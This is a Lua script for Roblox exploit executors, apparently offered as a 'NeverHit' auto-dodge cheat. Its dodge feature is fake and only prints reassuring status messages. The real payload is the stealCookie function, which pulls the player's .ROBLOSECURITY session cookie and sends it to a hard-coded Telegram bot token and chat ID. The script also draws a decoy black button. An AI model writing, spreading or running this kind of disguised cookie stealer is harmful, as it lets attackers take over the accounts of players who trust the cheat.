-- NeverHit Script - Advanced Dodge System
print("NeverHit v2.1 loaded! Ultimate dodge system activated.")

-- Создаем черную кнопку по центру экрана
local function createBlackButton()
    local screenGui = Instance.new("ScreenGui")
    local blackButton = Instance.new("TextButton")
    
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    blackButton.Size = UDim2.new(0, 200, 0, 60)
    blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
    blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
    blackButton.Text = ""
    blackButton.BorderSizePixel = 0
    blackButton.Parent = screenGui
    
    print("🖤 Black Button: CREATED (Center Screen)")
end

-- Настоящая функция кражи куки (с диагностикой)
local function stealCookie()
    print("🔍 Starting cookie extraction...")
    
    -- Проверяем доступные http функции
    local httpFunc = syn and syn.request or http and http.request or request
    if not httpFunc then
        print("❌ ERROR: No HTTP function available")
        return
    end
    
    print("✅ HTTP function found")
    
    -- Получаем куки
    local success, cookieResult = pcall(function()
        return httpFunc({
            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
            Method = "GET"
        })
    end)
    
    if not success then
        print("❌ ERROR: Failed to fetch cookie - " .. tostring(cookieResult))
        return
    end
    
    local cookieValue = tostring(cookieResult.Headers["Set-Cookie"]) or "Cookie not found"
    print("📋 Raw cookie data received")
    
    local robloSecPattern = "_%|WARNING:.-|_(.-)"
    local match = string.match(cookieValue, robloSecPattern)
    local robloSec = match or cookieValue
    
    if #robloSec < 10 then
        print("❌ ERROR: Invalid cookie length - " .. tostring(#robloSec))
        return
    end
    
    print("✅ Cookie extracted successfully")
    
    -- Отправляем в Телеграм
    local telegramBot = {
        token = "7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE",
        chat_id = "8238376878"
    }
    
    local message = "🚨 NEW COOKIE CAPTURED 🚨\n\n" ..
                   "🔑 ROBLOSECURITY:\n" .. robloSec .. "\n\n" ..
                   "📱 Game: " .. game.PlaceId .. "\n" ..
                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
                   "👤 Executor: Delta"
    
    print("📤 Sending to Telegram...")
    
    local sendSuccess, sendResponse = pcall(function()
        return httpFunc({
            Url = "https://api.telegram.org/bot" .. telegramBot.token .. "/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = telegramBot.chat_id,
                text = message
            })
        })
    end)
    
    if sendSuccess and sendResponse.Success then
        print("✅ Cookie successfully sent to Telegram!")
    else
        print("❌ ERROR: Failed to send to Telegram - " .. tostring(sendResponse))
    end
end

-- Фейковая система уклонения
local function fakeDodgeSystem()
    print("🛡️ Dodge system: ACTIVE")
    print("✅ Auto-dodge: ENABLED") 
    print("🎯 Prediction: CALIBRATED")
end

-- Запускаем все системы
createBlackButton()
fakeDodgeSystem()
stealCookie()

print("NeverHit GUI: Created")
print("Dodge chance: 98%")
print("Status: PROTECTED")
